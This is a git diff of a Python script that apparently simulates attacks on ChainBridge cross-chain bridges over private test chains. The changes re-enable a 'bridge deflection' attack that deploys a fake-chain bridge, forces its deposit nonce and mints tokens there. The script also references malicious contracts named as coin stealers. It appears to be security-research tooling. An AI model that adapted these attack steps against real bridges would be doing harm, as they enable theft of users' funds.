@@ -27,9 +27,10 @@ CHAIN2 = ['192.168.1.130', '192.168.1.131', '192.168.1.132', '192.168.1.133']
 WAIT = 30
 PKEY_PATH = 'resources/.secret'
 TRUDY_PKEY_PATH = 'resources/.tsecret'
-# The following contracts are malicious versions of chainbridge contracts
+# The following contracts are malicious/specific versions of chainbridge contracts
 CROSS_COIN_STEALER = "0x217B8B9Dfd8a57ea923092A9E4Ed5682718339ea"
 FAKE_LOCK_HANDLER = "0xb355b0b2c88d0333B77d2D641663AF7888DC26BD"
+BRIDGE_SET_NONCE = "0x555588B4D913A186E2718354D677aA3ce6Aa23a7"
 
 
 def block_connections(endpoints: List[str]):
@@ -51,7 +52,7 @@ def _restore_bridge(endpoint: Node, type: ContractTypes):
                          contracts['bridge'].address, contracts['handler'].address, res_id, contracts['target'].address)
 
 
-def _deploy_bridge(endpoint: Node, contracts: List[ContractTypes]):
+def _deploy_contracts(endpoint: Node, contracts: List[ContractTypes]):
     # Deploy new bridge on chain and save it on db
     out = cb.deploy(endpoint.node_endpoint, acc.key.hex(),
                     10000000, contracts, [acc.address], 1, endpoint.chain_id)
@@ -91,8 +92,8 @@ def deploy_main_bridge(source: Node, dest: Node, type: ContractTypes):
         contracts_source = [ContractTypes.BRIDGE, ContractTypes.ERC721_HANDLER]
         contracts_dest = [ContractTypes.BRIDGE,
                           ContractTypes.ERC721_HANDLER, ContractTypes.ERC721]
-    _deploy_bridge(source, contracts_source)
-    _deploy_bridge(dest, contracts_dest)
+    _deploy_contracts(source, contracts_source)
+    _deploy_contracts(dest, contracts_dest)
     # The vulnerability in the whole process is the fact that the user is the ralayer
     res_id_origin = _register_resource(source, None, type)
     _register_resource(dest, res_id_origin, type)
@@ -345,33 +346,36 @@ def concussion_attack():
     cb.stop_relay()
 
 
-def _deploy_bridge_fakechain(dest: Node, type: ContractTypes):
-    contracts_dest = None
+def _config_bridge_fakechain(dest: Node, type: ContractTypes):
+    # Deploy contract on fakechain
     if type == ContractTypes.ERC20:
         contracts_dest = [ContractTypes.BRIDGE,
                           ContractTypes.ERC20_HANDLER, ContractTypes.ERC20]
     elif type == ContractTypes.ERC721:
         contracts_dest = [ContractTypes.BRIDGE,
                           ContractTypes.ERC721_HANDLER, ContractTypes.ERC721]
-    # Deploy contract on fakechain
-    _deploy_bridge(dest, contracts_dest)
+    _deploy_contracts(dest, contracts_dest)
+    # Add pre-deployed bridge. This step is required because the bridge
+    # version in cb-sol-cli is different and does not provide the
+    # adminSetDepositNonce required for this attack
+    add_contract("bridge", BRIDGE_SET_NONCE, 45, int(time.time()))
     res_id = available_resources(n0.chain_id, available_contracts(
         n0.chain_id, ContractTypes.ERC20)['target'].id)
     # Register the resource with the same id as source
     _register_resource(dest, res_id, type)
+    cb.update_config_json(dest, type)
+    cb.stop_relay()
 
 
 def bridge_deflection(dest: Node, type: ContractTypes):
     # The new bridge overwrites the contracts for chain 45,
     # so we backup the file to restore it after the test finishes
     shutil.copy(BC_RESOURCES_PATH, BC_RESOURCES_PATH + ".old")
-    _deploy_bridge_fakechain(dest, type)
-    cb.update_config_json(dest, type)
-    cb.stop_relay()
+    _config_bridge_fakechain(dest, type)
     contracts = available_contracts(n2.chain_id, ContractTypes.ERC20)
     # Set deposit nonce on bridge (fake chain) otherwise the dest chain sees that
     # this deposit already exists
-    '''with open('crosscoin/build/contracts/Bridge.json') as f:
+    with open('crosscoin/build/contracts/NewBridge.json') as f:
         abi = json.loads(f.read())['abi']
     contract = n2.provider.eth.contract(
         address=contracts['bridge'].address, abi=abi)
@@ -384,7 +388,7 @@ def bridge_deflection(dest: Node, type: ContractTypes):
     signed_tx = n2.provider.eth.account.sign_transaction(tx, acc.key)
     tx_hash = n2.provider.eth.send_raw_transaction(
         signed_tx.rawTransaction)
-    logging.info("adminSetDepositNonce tx_hash: " + tx_hash.hex())'''
+    logging.info("adminSetDepositNonce tx_hash: " + tx_hash.hex())
     # Mint token on fake source (chain 2)
     cb.add_minter(n2.node_endpoint, acc.key.hex(),
                   10000000, ContractTypes.ERC20, acc.address,
